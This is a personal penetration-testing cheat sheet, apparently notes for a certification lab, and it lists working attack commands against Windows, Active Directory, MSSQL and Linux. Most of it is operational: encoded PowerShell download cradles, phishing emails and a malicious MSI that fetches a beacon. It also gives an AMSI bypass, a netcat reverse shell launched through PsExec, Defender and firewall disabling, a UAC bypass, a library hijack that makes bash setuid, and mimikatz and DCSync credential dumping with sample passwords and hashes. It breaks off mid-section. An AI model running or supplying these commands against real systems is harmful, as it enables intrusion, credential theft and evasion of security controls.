# Pentesting-Cheatsheet
Pentesting Cheatsheet that helps me with quickly getting all my commands


# Useful commands

# Prep

- [ ]  creating download cradle for run.ps1
    - steps
        
        encoding payload
        
        ```powershell
        $Command = "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.49.136/run.ps1')"
        $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Command)
        $EncodedCommand = [Convert]::ToBase64String($Bytes)
        $EncodedCommand
        ```
        
- [ ]  Change IP in run.ps1
- [ ]  Change IP in hollower.ps1
- [ ]  Compile phollow.dll
- [ ]  Compile ProcessHollower.exe
- [ ]  nimcrypt on ProcessHollower.exe
    - command
        
        ```powershell
        ./nimcrypt -f /home/luca/OSEP/luca_data/www/ProcessHollowing.exe -t csharp -g -u -o /home/luca/OSEP/luca_data/www/phollow-enc.exe
        ```
        
- [ ]  Compile CLM-Bypass.exe → run.ps1 download cradle
- [ ]  Metasploit autorun script → meterpreter handlers

Download cradle encoded:

```powershell
powershell -Sta -Nop -Window Hidden -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQAOQAuADEAMAA5AC8AcgB1AG4ALgBwAHMAMQAnACkA
```

# Enumeration

**Enumerating host external ports**

- `threader3000`
- `nmap -sC -sV <ip>`
- quick nmap with no ping: `nmap -sC -sV --min-rate=5000 -Pn 192.168.120-122`

**Enumerating webpages**

- Gobuster on windows server
    - `gobuster dir -u http://10.10.110.10/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x html,asp,aspx,txt`
- Gobuster Linux server
    - `gobuster dir -u https://www.ahs2022.com/mailman/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x html,php,txt`
- Wappalyzer output, Burpsuite to inspect response pages

**Other ways of enumeration**

enum4linux: `enum4linux -U -M -S -P -G 10.13.38.16`

SMB connect

- crackmapexec
    - spider all directories `proxychains crackmapexec smb 10.9.10.14 -d cyber.local -u Robert.Ortiz -p to7oxaith2Vie9 -M spider_plus`
- smbclient
    - list directories: `smbclient -L \\\\192.168.178.163\\`
    - normal connect: `smbclient -U user \\\\192.168.178.163\C$`
    - with hash to domain `smbclient //cyapp.cyber.local/c$ -U administrator --pw-nt-hash 8306115eb5aeb7072c5c601b8507a562 -W cyber.local`

Try uploading SCF files to SMB they can give you a NetNTLMv2 hash on responder

- code
    
    ```makefile
    [Shell]
    Command=2
    IconFile=\\10.10.14.7\share\habibi.ico
    [Taskbar]
    Command=ToggleDesktop
    ```
    
- create a file called `notscf.scf`
- run responder with `sudo responder -I tun0`
- smbcacls
    - user rights on folder Users/Public `smbcacls -N '//10.10.10.103/Department Shares' Users/Public`
- Other tools: https://github.com/Kevin-Robertson/Inveigh & https://github.com/purpleteam/snarf

# Initial access / Exploitation

phishing →

send mail for phishing hta

`swaks --from habibi@tricky.com --to will@tricky.com --header 'Subject: http://192.168.49.136' --body email.body --server mail01.tricky.com`

- Email body (content)
    
    ```html
    Hi Will,
    
    I have an issue with the mail system not reaching http://192.168.49.136/test.hta
    
    Sincerelly,
    Habibi
    ```

`swaks --from habibi@tricky.com --to will@tricky.com --header 'Subject: help me quick' --body email.body --attach malicious.doc --server mail01.tricky.com`

- body
    
    ```html
    Hi Will,
    
    I have an issue with the mail system not reaching me. Could you pls check the problem described in the doc file?
    Thank you!
    
    Sincerelly,
    Habibi
    ```
    

### MSSQL

SQL injection

- sqlmap cmd shell: `sqlmap -r search.req --batch --os-shell --dbms=MSSQL`
- sqlmap sql shell: `sqlmap -r search.req --batch --sql-shell --dbms=MSSQL`

SQL logins with creds found in files

`impacket-mssqlclient webapp11@192.168.136.149`

Change password of user inside table `UPDATE wp_users SET user_pass = 'hash' WHERE ID = 1;`

- SQL linked server
    
    impacket-mssqlclient
    
    `EXEC ('SELECT user') at [SQL27];`
    
    `EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') at [SQL27];`
    
    `EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure;') at [SQL27];`
    
    `EXEC ('EXEC xp_cmdshell whoami;') at [SQL27];`
    
    Invoke-PowerUpSQL.ps1
    

unc path attack sql → relay attack

- generate signfile list with crackmap exec
    - `proxychains poetry run crackmapexec smb ~/OSEP/luca_data/chal4/ips.txt --gen-relay-list ~/OSEP/luca_data/chal4/signingfile`
    - change responder config **disable SMB and http inside: `/etc/responder/Responder.conf`**
    - run responder: `sudo responder -I tun0 -w -d`
    - run ntlmrelayx: `proxychains impacket-ntlmrelayx -tf signingfile -smb2support --no-http-server`
    - execute unc path command: `EXEC master..xp_dirtree '\\192.168.49.136\test;'`

RPC out disabled → enabled

- `EXEC sp_serveroption 'SQL03', 'rpc out', 'true';`

Access denied try impersonating

- `EXECUTE AS LOGIN = 'sa'; EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') at [sql03]`
- `EXECUTE AS LOGIN = 'sa'; EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure;') at [sql03]`
- `EXECUTE AS LOGIN = 'sa'; EXEC ('EXEC xp_cmdshell whoami;') at [sql03]`

**PowerUpSQL.ps1**

- command
    - locate local sql instaces: `Get-SQLInstanceLocal`
    - `iex(new-object net.webclient).downloadstring('http://10.10.14.198/PowerUpSQL.ps1')`
    - UNC path: `Get-SQLQuery -Verbose -Instance "CYWEBDW,1433" -Query "EXEC master..xp_dirtree '\\10.10.14.198\test;'"`
    - Enumerate impersonation (DBO user can out of the box impersonate)
        
        `Get-SQLQuery -Verbose -Instance "CYWEBDW,1433" -Query "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';"`
        
    - impersonate as SA: `Get-SQLQuery -Verbose -Instance "CYWEBDW,1433" -Query "EXECUTE AS LOGIN = 'sa'; SELECT user"`
    - Enumerate linked servers: `Get-SQLQuery -Verbose -Instance "CYWEBDW,1433" -Query "EXECUTE AS LOGIN = 'sa';SELECT srvname,isremote from sysservers"`
    - Enumerate linked servers: `Get-SQLQuery -Verbose -Instance "CYWEBDW,1433" -Query "EXECUTE AS LOGIN = 'sa';select * from master..sysservers"`
    - execute remote commands as SA: `Get-SQLQuery -Verbose -Instance "CYWEBDW,1433" -Query "EXECUTE AS LOGIN = 'sa';EXEC ('select current_user') at [m3sqlw.m3c.local];"`
    
    ```powershell
    Get-SQLQuery -Verbose -Instance "CYWEBDW,1433" -Query "EXECUTE AS LOGIN = 'sa';EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') at [m3sqlw.m3c.local];"
    Get-SQLQuery -Verbose -Instance "CYWEBDW,1433" -Query "EXECUTE AS LOGIN = 'sa';EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure') at [m3sqlw.m3c.local];"
    Get-SQLQuery -Verbose -Instance "CYWEBDW,1433" -Query "EXECUTE AS LOGIN = 'sa';EXEC ('EXEC xp_cmdshell whoami;') at [m3sqlw.m3c.local];"
    Get-SQLQuery -Verbose -Instance "CYWEBDW,1433" -Query "EXECUTE AS LOGIN = 'sa';EXEC ('EXEC xp_cmdshell ''powershell -c'';') at [m3sqlw.m3c.local];"
    ```
    
    - a server can be nested as well so you have SA on the remote on and from that SA on the current database again
    
    ```powershell
    EXEC ('EXEC (''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT SERVER1') AT SERVER2
    EXEC ('EXEC (''sp_configure ''''xp_cmdshell'''', 1; reconfigure;'') AT SERVER1') AT SERVER2
    EXEC ('EXEC (''xp_cmdshell ''''powershell.exe -exec bypass -c "iex(iwr http://<ip>/run.txt -usebasicparsing)"'''';'') AT SERVER1') AT SERVER2
    ```
    
    - create user in nested instance
    
    ```powershell
    EXEC ('EXEC (''EXEC sp_addlogin ''''super'''', ''''abc123!'''''') at [COMPATIBILITY\POO_PUBLIC]') at [COMPATIBILITY\POO_CONFIG];
    EXEC ('EXEC (''EXEC sp_addsrvrolemember ''''super'''', ''''sysadmin'''''') at [COMPATIBILITY\POO_PUBLIC]') at [COMPATIBILITY\POO_CONFIG];
    ```
    

### Webshell

From webshell to meterpeter

- program: `c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe`
- argument: `-Sta -Nop -Window Hidden -EncodedCommand`

AMSI bypass

```powershell
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
```

# Post exploitation

- PowerShell download cradles
    
    ```powershell
    Invoke Expression
    iex(new-object net.webclient).downloadstring('[http://192.168.49.145/PowerView.ps1](http://192.168.49.145/PowerView.ps1)');
    iex(new-object net.webclient).downloadstring('[http://192.168.49.145/SharpHound.ps1](http://192.168.49.145/SharpHound.ps1)');
    iex(new-object net.webclient).downloadstring('[http://192.168.49.136/run.ps1](http://192.168.49.145/rev.ps1)')
    more found inside of run.sp1
    
    Invoke Web request
    powershell -ep bypass iwr "http://192.168.49.145/mimikatz.exe" -outfile "C:\Windows\System32\spool\drivers\color\mimikatz.exe"
    powershell -ep bypass iwr "http://192.168.49.111/phollow-enc.exe" -outfile "C:\Windows\tasks\phollow-enc.exe"
    powershell -ep bypass iwr "http://192.168.49.145/rev.exe" -outfile "C:\Windows\System32\spool\drivers\color\rev.exe"
    powershell -ep bypass iwr "http://192.168.49.145/rev.exe" -outfile "C:\Windows\System32\spool\drivers\color\rev.exe"
    powershell -ep bypass iwr "http://192.168.49.145/PrintSpoofer.exe" -outfile "C:\Windows\System32\spool\drivers\color\PrintSpoofer.exe"
    iwr "http://192.168.49.145/snmptrap.exe" -outfile "C:\Windows\System32\snmptrap.exe"
    ```
    

Certutil download file `certutil -urlcache -split -f "http://192.168.49.136/mimikatz.exe" "C:\Windows\tasks\mimikatz.exe"`

### Privesc Scripts

Windows post exploitation Enum

- Winpeas
- Jaws
- PowerUp
- Seatbelt

Scheduled tasks

`Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State`

1. `schtasks /query /v /tn:name /fo list`

### Exploit local permissions

**always_install_elevated**

- commands
    
    `exploit(windows/local/always_install_elevated)` from msfconsole
    
    next up is the PowerUp one
    
    generate msi → `Write-UserAddMSI`
    
    execute msi → `msiexec /qn /i UserAdd.msi`
    
    Bypass signing →
    
    Generate msi with msfvenom
    
    `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.198 LPORT=443 -f msi EXITFUNC=thread -o rev.msi`
    
    Execute the file remotely
    
    `msiexec /qn /i "http://10.10.14.198/rev.msi"`
    
    Signing the file
    
    with microsoft wix tool
    
    - template
        
        ```powershell
        //bad.wix
        <?xml version="1.0"?>
        <Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
        <Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product Name" Version="0.0.1" Manufacturer="@_xpn_"
        Language="1033">
        <Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/>
        <Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
        <Directory Id="TARGETDIR" Name="SourceDir">
        <Directory Id="ProgramFilesFolder">
        <Directory Id="INSTALLLOCATION" Name="Example">
        <Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222">
        <CreateFolder/>
        </Component>
        </Directory>
        </Directory>
        </Directory>
        <Feature Id="DefaultFeature" Level="1">
        <ComponentRef Id="ApplicationFiles"/>
        </Feature>
        <CustomAction Id="SystemShell" Directory="TARGETDIR" ExeCommand="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe iex (i
        wr http://10.10.16.3/beacon.ps1 -UseBasicParsing)" Execute="deferred" Impersonate="no" Return="ignore"/>
        <InstallExecuteSequence>
        <Custom Action="SystemShell" After="InstallInitialize"></Custom>
        </InstallExecuteSequence>
        </Product>
        </Wix
        ```
        
    
    compile → `C:\Users\Ben\Desktop\Cybernetics+>"c:\Program Files (x86)\WiX Toolset v3.11\bin\candle.exe" bad.wix`
    
    signing it → `C:\Users\Ben\Desktop\Cybernetics+>"c:\Program Files (x86)\WiX Toolset v3.11\bin\light.exe" bad.wixobj`
    

### CLM / Applocker

**Bypass constrained language mode**

check language mode: `$ExecutionContext.SessionState.LanguageMode`

code to bypass: https://github.com/calebstewart/bypass-clm

run the bypass-clm.exe `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Windows\Tasks\bypass-clm.exe`

### Kerberoasting

- Unconstrained delegation
    
    `Get-NetComputer -Unconstrained`
    
    NT authority on the system that has Unconstrained delegation enabled
    
    `ls \\[dc03.infinity.com](http://dc03.infinity.com/)\pipe\spoolss`
    
    `.\Rubeus.exe monitor /interval:1`
    
    `.\SpoolSample.exe dc03.infinity.com web05.infinity.com`
    
- Constrained delegation
    
    Enumerate `Get-DomainUser -TrustedToAuth` & `Get-DomainComputer -TrustedToAuth`
    
    No shell as the user:
    
    - Get the hash for the user: `.\Rubeus.exe hash /password:lab`
    - Get the TGT if you dont have a shell as that user`.\Rubeus.exe asktgt /user:iissvc /domain:prod.corp1.com /rc4:2892D26CDF84D7A70E2EB3B9F05C425E /nowrap`
    
    Have shell as user:
    
    - or get the tgt `.\rubeus-enc.exe tgtdeleg /nowrap`
    
    Get the ticket as administrator on the machine we have the constrained delegation to `.\Rubeus-enc.exe s4u /impersonateuser:administrator /msdsspn:CIFS/file01.evil.com /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /ptt /nowrap /ticket:<ticket>` 
    
    Other way with Impacket
    
    `impacket-getST -spn SPN/machine_target from_machine -hashes :X`
    
    There are scenarios where you are not allowed to impersonate administrators so looks for groups with high priv rights that are not standard. like IT admins or Server admins.
    
    *“One caveat- impersonated users can not be in the "Protected Users" security group or otherwise have delegation privileges revoked.”* 
    
- Resource Based Constrained Delegation
    
    Normal
    
    ```powershell
    #Powermad
    New-MachineAccount -MachineAccount notattacker -Password $(ConvertTo-SecureString 'Password123!' -AsPlainText -Force) -Verbose
    #Powerview
    $attacker = "notattacker"
    Get-DomainComputer -Identity $attacker
    $target = "m3dc.m3c.local"
    Get-DomainComputer -Identity $target
    $sid = Get-DomainComputer -Identity $attacker -Properties objectsid | Select -Expand objectsid
    $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($sid))"
    $SDbytes = New-Object byte[] ($SD.BinaryLength)
    $SD.GetBinaryForm($SDbytes,0)
    Get-DomainComputer -Identity $target | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
    $RBCDbytes = Get-DomainComputer $target -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
    $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RBCDbytes, 0
    $Descriptor.DiscretionaryAcl
    ConvertFrom-SID <SID>
    #local
    .\Rubeus-enc.exe s4u /user:notattacker$ /rc4:AA6EAFB522589934A6E5CE92C6438221 /impersonateuser:administrator /msdsspn:CIFS/jump09.ops.comply.com /ptt
    #remote
    proxychains impacket-getST -impersonate administrator -spn CIFS/jump09.ops.comply.com ops/notattacker$:habibi -dc-ip 172.16.136.165
    ```
    
    A Computer Object Takeover Primitive - ACL-based computer takeover primitive!
    
    If the above shown approach doesnt work it can mean that not every account in the domain has the rights to execute the ***S4U2Self.***
    
    [https://blog.harmj0y.net/redteaming/another-word-on-delegation/](https://blog.harmj0y.net/redteaming/another-word-on-delegation/)
    
    [https://gist.github.com/HarmJ0y/a1ae1cf09e5ac89ee15fb3da25dcb10a](https://gist.github.com/HarmJ0y/a1ae1cf09e5ac89ee15fb3da25dcb10a)
    
    - ***In order to execute this, a user needs to be able to execute the S4U2Self process (the TRUSTED_TO_AUTH_FOR_DELEGATION UserAccountControl setting, bit 16777216).***
    
    ```powershell
    $TargetComputer = "m3dc.m3c.local"
    #list users with S4U2Self set
    Get-DomainObject -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=16777216)' -Properties samaccountname,useraccountcontrol | fl
    #$get our attacker's SID (account with rights over the target)
    $AttackerSID = Get-DomainUser svc_apache -Properties objectsid | Select -Expand objectsid
    
    #verify genericwrite
    $ACE = Get-DomainObjectACL $TargetComputer | ?{$_.SecurityIdentifier -match $AttackerSID}
    $ACE
    ConvertFrom-SID $ACE.SecurityIdentifier
    
    #Identity we can control that we give S4U access to the target
    $S4UIdentity = "m3c\svc_sql"
    $IdentitySID = ((New-Object -TypeName System.Security.Principal.NTAccount -ArgumentList $S4UIdentity).Translate([System.Security.Principal.SecurityIdentifier])).Value
    $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($IdentitySID))"
    $SDBytes = New-Object byte[] ($SD.BinaryLength)
    $SD.GetBinaryForm($SDBytes, 0)
    Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
    
    #check if it was successfull
    $RawBytes = Get-DomainComputer $TargetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
    $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0
    $Descriptor.DiscretionaryAcl
    ConvertFrom-SID $Descriptor.DiscretionaryAcl.SecurityIdentifier
    
    #rubeus
    Rubeus-enc.exe s4u /user:constraineduser /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:harmj0y /msdsspn:cifs/primary.testlab.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /ptt
    #or
    Rubeus-enc.exe tgtdeleg /nowrap
    Rubeus-enc.exe s4u /user:constraineduser /ticket:<ticket> /impersonateuser:administrator /msdsspn:cifs/primary.testlab.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /ptt
    ```
    
    reference, Output for S4U2Self check
    
    ![Untitled](Useful%20commands%20d3e2af84442f4e6abbcf04d683ebdb46/Untitled.png)
    

## AD exploitation

- Child domain to root domain enterprise administrator
    
    Get krbtgt hash from the child domain
    
    - `lsadump::dcsync /domain:ops.comply.com /user:ops\krbtgt`
    
    Get the SID’s from both child and root domain (Powerview)
    
    - `Get-DomainSID -Domain ops.comply.com`
    - `Get-DomainSID -Domain comply.com`
    
    Create golden ticket
    
    ```powershell
    kerberos::golden /user:notahacker /domain:domain.com /sid:S-1-5-21-2032401531-514583578-4118054891 /krbtgt:7c7865e6e30e54e8845aad091b0ff447 /sids:S-1-5-21-1135011135-3178090508-3151492220-519 /ptt
    ```
    
    Now dcsync the root domain and get the domain administrator
    
    - `lsadump::dcsync /domain:comply.com /user:administrator`

### Write-DACL

creating credential: `$creds = New-Object System.Management.Automation.PSCredential ("[tricky.com](http://tricky.com/)\sqlsvc",(ConvertTo-SecureString "4dfgdfFFF542" -AsPlainText -Force))`

Add generic-all: `Add-DomainObjectAcl -TargetIdentity Mailadmins -PrincipalIdentity sqlsvc -Rights All -Credential $credsrulon -Verbose`

add user we own to group: `Add-DomainGroupMember -Identity 'MAILADMINS' -Members 'will' -Credential $creds`

Execute commands on another machine

`PsExec.exe -accepteula -s -i \\rdc02 powershell /c "iwr -uri [http://192.168.49.145/nc64.exe](http://192.168.49.145/nc64.exe) -o c:\windows\tasks\nc64.exe; c:\windows\tasks\nc64.exe 192.168.49.145 443 -e cmd.exe"`

`Invoke-Command -ComputerName [RDC02.COMPLY.COM](http://rdc02.comply.com/) -ScriptBlock {powershell -Sta -Nop -Window Hidden -EncodedCommand <encoded command>}`

### Windows Privesc / lateral movement

PrintSpoofer to abuse `SeImpersonatePrivilege`: ‣

- `.\PrintSpoofer.exe -i -c cmd`
- `.\PrintSpoofer.exe -i -c powershell`

Vulnerable Service

- Commands
    - PowerUp → `Invoke-ServiceAbuse -Name 'SNMPTRAP'`
    - Enable service → `sc.exe config "SNMPTRAP" start=auto`
    - Change account for execution → `sc config SNMPTRAP obj= "NT AUTHORITY\SYSTEM"`

SQL managment interface from RDP. Check for SQL server management*

Open ports `netstat -na`

Hidden files: `Get-ChildItem -Hidden`

Search files on meterpreter: `search -f *.<ext>`

Find extra drives:

- `get-psdrive` //powershell
- `show_mount` // meterpreter

### UAC

Running our download cradle and bypassing UAC.

- `New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value "<download cradle>" -Force`
- `New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force`
- `C:\Windows\System32\fodhelper.exe`

Powershell Invoke-Command

Execute commands on remote boxes (requires admin privileges on remote box or winrm)

- With credential option
    - `$Cred = New-Object System.Management.Automation.PSCredential ("core.cyber.local\steven.sanchez",(ConvertTo-SecureString "zui4uaS8oeng" -AsPlainText -Force))`
    - `$sess = New-PSSession -Credential $Cred -ComputerName corewebtw.core.cyber.local`
    - `Invoke-Command -ScriptBlock {powershell -Sta -Nop -Window Hidden -EncodedCommand <encoded command>} -Session $sess`
- Without Credential option
    - `$sess = New-PSSession -ComputerName corewebtw.core.cyber.local`
    - `Invoke-Command -ScriptBlock {powershell -Sta -Nop -Window Hidden -EncodedCommand <encoded command>} -Session $sess`

### Linux privesc

Linux hijack ssh session: 

- `ls -la ~/.ssh/controlmaster`
- `cd ~/.ssh/controlmaster`
- `ssh <session>`

ssh with key

- generate id_rsa `ssh-keygen`
- put public key into authorized_keys `echo "<key>" > authorized_keys`
- log in: `ssh -i id_rsa pete@complyedge.com@192.168.136.164`

ssh scp copy files

`scp -i id_rsa pete@complyedge.com@192.168.136.164:/tmp/krb5cc_75401103_l9QQnw .`

Ansible vault

- `/usr/share/john/ansible2john.py ansible-vault.hash > hash.txt`
- `john hash.txt --wordlist-/usr/share/wordlists/rockyou.txt`
- on victim machine: `cat ansible-vault.hash | ansible-vault decrypt`

Ansible hosts

- if ansbileadm is logged on → `su ansibleadm`
- check for other machines → `cat /etc/ansible/hosts`
- execute remote commands ansible groups
    
    `ansible <group> -a "wget 192.168.49.110/xor_shell" --become`
    
    `ansible <group> -a "ls -la" --become`
    
    `ansible <group> -a "chmod +x ./xor_shell" --become`
    
    `ansible <group> -a "./xor_shell" --become`
    

Linux driver file hijack

- `pspy64 > pspy.out`
- ldd on recuring binary: `ldd /bin/netstat`
- `mkdir ~/.ldlib`
- `echo "export LD_LIBRARY_PATH=/home/<user>/.ldlib/" >> ~/.bashrc`
- `echo "alias sudo='sudo LD_LIBRARY_PATH=/home/<user>/.ldlib'" >> ~/.bashrc`
- code
    
    ```c
    #include <stdio.h>
    #include <stdlib.h>
    #include <unistd.h> // for setuid/setgid
    
    static void runmahpayload() __attribute__((constructor));
    
    void runmahpayload() {
    	setuid(0);
    	setgid(0);
        printf("DLL HIJACKING IN PROGRESS \n");
        system("chmod +s /bin/bash");
    }
    ```
    
    compile code steps
    
    ```c
    gcc -Wall -fPIC -c -o lib.o lib.c
    gcc -shared -o lib.so lib.o
    cp lib.so libpthread.so.0
    cp libpthread.so.0 ../www
    ```
    

Listen to network traffic → `tcpdump -i any`

Easy exploits that can be done with `sudo -l` → [https://gtfobins.github.io/](https://gtfobins.github.io/)

If gitlab is installed try:

- git commands
    - `git log | grep commit`
    - `git show <commit>`
    - `git log --grep="<pattern>"` // for example password or pass
    - `git diff` //to see changes and possibly find a secret
    - if `git pull` has sudo try:
        - cd into `.git/hooks/`
        - touch post-merge
        - add the file and put a reverse shell into it
        - `sudo git pull`

**Crackmapexec**

- dump lsass:
    - `crackmapexec smb corewkt002.core.cyber.local -u administrator -d . --lsa`
    - `crackmapexec smb 172.16.136.151 -u administrator --local-auth -H <hash> --lsa`
    - `proxychains crackmapexec smb corewkt002.core.cyber.local -u administrator -d . -p -M lsassy`
- validate hash: `proxychains crackmapexec smb 10.9.15.10 -d cyber.local -u administrator -H 8306115eb5aeb7072c5c601b8507a562`
    - `proxychains cme smb ips.txt -u users.txt -H hashes.txt --no-bruteforce`
- test for users with password: `crackmapexec smb 10.9.15.10 -d core.cyber.local -u core.domainusers.txt -p to7oxaith2Vie9`

Psexec → NT authority on own system: `.\PsExec.exe -s -i cmd.exe`

**Read LAPS passwords**

remote toolkit: https://github.com/n00py/LAPSDumper

- `python laps.py -u "ted" -p aad3b435b51404eeaad3b435b51404ee:e929e69f7c290222be87968263a9282e -d domain.com`

On the machine:

LAPSToolKit.ps1: https://github.com/leoloobeek/LAPSToolkit

- `Get-LAPSComputers`

Powerview: `Get-NetComputer | Select-Object 'name','ms-mcs-admpwd'`

### LOLbas

bitsadmin download powershell

`Start-BitsTransfer -Source <source_url> -Destination <destination_path>`

Bitsadmin cmd

`bitsadmin /create 1 bitsadmin /addfile 1 https://live.sysinternals.com/autoruns.exe c:\data\playfolder\autoruns.exe bitsadmin /RESUME 1 bitsadmin /complete 1`

### Windows Defender Commands

- Disable defender / modify defender
    
    `Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true`
    
    `netsh AdvFirewall set allprofiles state off`
    
    `Set-MpPreference -DisableRealtimeMonitoring $true`
    
    only exclude path for scanning: `set-mppreference -exclusionpath c:\programdata`
    
    rollback definitions: `cmd /c "C:\Program Files\Windows Defender\MpCmdRun.exe" -removedefinitions -all`
    

### **Credential dumping**

DCsync attack

- `impacket-secretsdump -dc-ip 192.168.136.120 -just-dc 'infinity/administrator@192.168.136.120' -hashes :5f9163ca3b673adfff2828f368ca3760`
- secrets dump with ticket: `impacket-secretsdump -k -dc-ip 172.16.111.168 dmzdc01.complyedge.com`
- Password database in AD domain controller → `ntds.dit`
- mimikatz
    - `lsadump::dcsync /domain:infinity.com /user:administrator"`
- mimikatz powershell
    - `Invoke-Mimikatz -Command '"lsadump::dcsync /user:m3c\Norma.Branham"'`

Rubeus Pass the Ticket `.\Rubues.exe ptt /ticket:base64Here`

mimikatz pass the ticket `kerberos::ptt <ticket here>`

- mimikatz other commands
    
    ```powershell
    #general
    privilege::debug
    log
    log customlogfilename.log
    
    #sekurlsa
    sekurlsa::logonpasswords
    sekurlsa::logonPasswords full
    sekurlsa::tickets /export
    sekurlsa::pth /user:Administrateur /domain:winxp /ntlm:f193d757b4d487ab7e5a3743f038f713 /run:cmd
    
    #kerberos
    kerberos::list /export
    kerberos::ptt c:\chocolate.kirbi
    kerberos::golden /admin:administrateur /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /krbtgt:310b643c5316c8c3c70a10cfb17e2e31 /ticket:chocolate.kirbi
    
    #crypto
    crypto::capi
    crypto::cng
    crypto::certificates /export
    crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE
    crypto::keys /export
    crypto::keys /machine /export
    
    #vault & lsadump
    vault::cred
    vault::list
    token::elevate
    vault::cred
    vault::list
    lsadump::sam
    lsadump::secrets
    lsadump::cache
    token::revert
    lsadump::dcsync /user:domain\krbtgt /domain:lab.local
    token::elevate
    
    #pth
    sekurlsa::pth /user:Administrateur /domain:chocolate.local /ntlm:cc36cf7a8514893efccd332446158b1a
    sekurlsa::pth /user:Administrateur /domain:chocolate.local /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9
    sekurlsa::pth /user:Administrateur /domain:chocolate.local /ntlm:cc36cf7a8514893efccd332446158b1a /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9
    sekurlsa::pth /user:Administrator /domain:WOSHUB /ntlm:{NTLM_hash} /run:cmd.exe
    
    #ekeys
    sekurlsa::ekeys
    
    #dpapi
    sekurlsa::dpapi
    
    #minidump
    sekurlsa::minidump lsass.dmp
    
    #ptt
    kerberos::ptt Administrateur@krbtgt-CHOCOLATE.LOCAL.kirbi
    
    #golden/silver
    kerberos::golden /user:utilisateur /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /krbtgt:310b643c5316c8c3c70a10cfb17e2e31 /id:1107 /groups:513 /ticket:utilisateur.chocolate.kirbi
    kerberos::golden /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /aes256:15540cac73e94028231ef86631bc47bd5c827847ade468d6f6f739eb00c68e42 /user:Administrateur /id:500 /groups:513,512,520,518,519 /ptt /startoffset:-10 /endin:600 /renewmax:10080
    kerberos::golden /admin:Administrator /domain:CTU.DOMAIN /sid:S-1-1-12-123456789-1234567890-123456789 /krbtgt:deadbeefboobbabe003133700009999 /ticket:Administrator.kiribi
    
    #tgt
    kerberos::tgt
    
    #purge
    kerberos::purge
    ```
    

Exporting ticket linux: `export KRB5CCNAME=administrator.ccache` → export ticket

keytab file → `/opt/KeyTabExtract/keytabextract.py krb.keytab`

rubeus base64 to linux ccache:

Shadow copy

- commands
    
    creating the shadow copy of the C drive `wmic shadowcopy call create Volume='C:\'`
    
    Next up listing the shadow copies `vssadmin list shadows`
    
    Copy SAM file →
    
    `Copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam <new location>`
    
    Copy SYSTEM file →
    
    `Copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system <new location>`
    
    Command to extract the hashes:
